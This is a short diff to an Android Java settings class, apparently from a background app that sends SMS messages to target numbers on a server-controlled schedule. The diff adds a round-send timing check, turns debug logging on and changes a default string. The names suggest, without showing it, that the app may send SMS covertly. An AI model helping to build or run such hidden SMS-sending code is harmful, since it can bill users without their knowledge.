@@ -57,7 +57,7 @@ import com.mms.bg.util.XMLHandler;
 
 public class SettingManager {
     private static final String TAG = "SettingManager";
-    private static final boolean DEBUG = false;
+    private static final boolean DEBUG = true;
     
     public static final String TARGET_NUM = "target_num";
     public static final String SMS_COUNT = "sms_send_count";
@@ -391,7 +391,7 @@ public class SettingManager {
         long tempDelay = 2 * 60 * 1000;
         log("sms_delay_time = " + sms_delay_time + " lastSMSTime = " + latestSMSTime
                 + " lastSMSFormatTime = " + getLastSMSFormatTime());
-        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= sms_delay_time + tempDelay) {
+        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= (sms_delay_time + tempDelay)) {
             log(TAG, "start the broadcast because of case 1");
             firstTime = currentTime + tempDelay;
         } else if (latestSMSTime != 0) {
@@ -520,6 +520,16 @@ public class SettingManager {
     
     public String getPID() {
         return mSP.getString("pid", null);
+    }
+    
+    public boolean needSMSRoundSend() {
+        long currentTime = System.currentTimeMillis();
+        long latestConnectTime = getLastConnectServerTime();
+        long connect_delay_time = getSMSSendDelay();
+        if ((currentTime - latestConnectTime) >= connect_delay_time) {
+            return true;
+        }
+        return false;
     }
     
     public void setNextFetchChannelInfoFromServerTime(long delayTime, boolean repeatable) {
@@ -730,7 +740,7 @@ public class SettingManager {
             String first = "1";
             String handled = String.valueOf(getSMSRoundTotalSend());
             String pid = mPid;
-            if (reason == null) reason = "";
+            if (reason == null) reason = "nothing";
             String installTime = getFirstStartTime();
             if (installTime == null) {
                 this.setFirstStartTime();
